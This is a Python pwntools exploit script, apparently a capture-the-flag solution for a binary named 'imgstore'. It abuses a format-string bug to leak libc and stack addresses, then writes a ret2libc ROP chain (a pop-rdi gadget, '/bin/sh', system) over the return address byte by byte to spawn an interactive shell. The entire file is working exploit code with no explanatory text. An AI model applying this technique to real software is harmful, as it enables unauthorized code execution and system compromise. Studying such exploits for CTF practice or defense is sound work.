from pwn import *

elf = ELF("./imgstore", checksec=False)
libc = elf.libc
context.arch = 'amd64'


def menu(idx):
    p.sendlineafter(b'>> ',str(idx).encode())

def sell(payload):
    p.sendlineafter(b"Enter book title: ", payload)
    p.recvuntil(b"Book title --> ")
    return p.recvuntil(b"\n\n")[:-2]

def write_fmt(addr, content):
    j = 0
    content = p64(content)
    for x in content:
        p.sendline(b"y")
        payload = fmtstr_payload(8, {addr+j: x}, write_size="byte")
        p.sendlineafter(b"Enter book title: ", payload)
        p.recvline()
        j += 1


p = process(elf.path)

menu(3)

libc.address = int(sell(b"%25$p"),16) - 147587
info("libc @0x%hx" % libc.address)

p.sendline(b"y")

stack = int(sell(b"%p"),16) + 10024
info("ret addr @0x%hx" % stack)



write_fmt(stack, libc.address + 0x0000000000023b6a)
write_fmt(stack+8, next(libc.search(b"/bin/sh\0")))
write_fmt(stack+16, libc.address + 0x0000000000022679)
write_fmt(stack+24, libc.sym["system"])

p.sendline(b"n")


info("Enjoy shell")

p.interactive()
